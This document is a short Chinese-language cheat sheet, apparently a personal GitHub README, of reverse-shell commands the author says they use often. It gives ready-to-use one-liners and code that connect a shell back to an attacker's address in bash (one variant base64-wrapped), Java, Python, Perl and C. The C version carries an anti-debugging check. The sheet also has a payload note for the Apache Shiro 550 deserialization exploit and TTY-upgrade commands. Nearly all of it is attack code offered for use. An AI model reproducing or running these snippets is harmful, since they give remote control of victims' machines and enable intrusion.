# ReverseShell
自己经常使用的反弹shell命令
## bash
```
bash -c {echo,xxx}|{base64,-d}|{bash,-i}
bash -c "bash -i >& /dev/tcp/ip/port  0>&1"
```
## java
```java
try{
    Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/ip/2333;cat <&5 | while read line; do $line 2>&5 >&5; done"});
}catch (IOException e){
    try{
        Runtime.getRuntime().exec(new String[]{"cmd", "/c", "calc"});
    }catch (IOException ee){
    }
}
```
### shiro 550
反弹shell
https://bkfish.gitee.io/2020/04/24/Apache-Shiro-1-2-4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89%E5%A4%8D%E7%8E%B0%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91/
```
cc2 
bash -c bash${IFS}-i${IFS}>&/dev/tcp/XXXXX/XX<&1
```
## python
```
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("ip",4444))
os.dup2(s.fileno(),0) 
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```
## perl
```
perl -e 'use Socket;$i="ip";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
## c
来自m3师傅
```c
#include <stdio.h>
#include <unistd.h>
#include <sys/wait.h>
#include <stdlib.h>


#include <sys/ptrace.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <sys/socket.h>

__attribute__((constructor)) void debugCheck()
{
    if(ptrace(PTRACE_TRACEME,0,1,0) == -1)
    {
        printf("debug found");
        exit(0);
    }
}

int main(int argc,char** argv)
{
    int status;
    printf("Main Process:%d\n",getpid());

    if(fork() == 0)
    {
        printf("Child Process:%d\n",getpid());
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = inet_addr("127.0.0.1");
        addr.sin_port = htons(2333);
        int fd = socket(AF_INET,SOCK_STREAM,0);
        if(!connect(fd,(const struct sockaddr *)&addr,sizeof(addr)))
        {
            printf("connect success\n");
        }
        
        dup2(fd,0); 
        dup2(fd,1); 
        dup2(fd,2); 
        char* argv[] = {"/bin/bash",NULL};
        execve("/bin/bash",argv,'\0'); 
    }
    pid_t child_pid = wait(&status);
    printf("Child PID:%d Terminate Status:%d\n",child_pid,WEXITSTATUS(status));

}
```

## 交互式
```
python -c 'import pty;pty.spawn("/bin/bash")'
echo os.system('/bin/bash')
/bin/sh -i
```
